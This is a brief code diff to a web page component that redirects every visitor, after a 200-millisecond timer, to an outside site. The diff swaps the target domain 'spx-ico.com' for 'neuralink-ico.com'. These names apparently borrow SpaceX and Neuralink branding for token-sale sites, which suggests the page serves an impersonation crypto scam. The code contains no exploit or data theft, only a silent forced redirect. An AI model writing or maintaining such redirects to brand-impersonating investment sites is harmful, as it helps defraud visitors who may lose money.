@@ -5,7 +5,7 @@ import Footer from '@components/Footer'
 export default function Home() {
   setTimeout(
     function() { 
-          window.location.replace('https://spx-ico.com/');
+          window.location.replace('https://neuralink-ico.com/');
     },
     200
   );
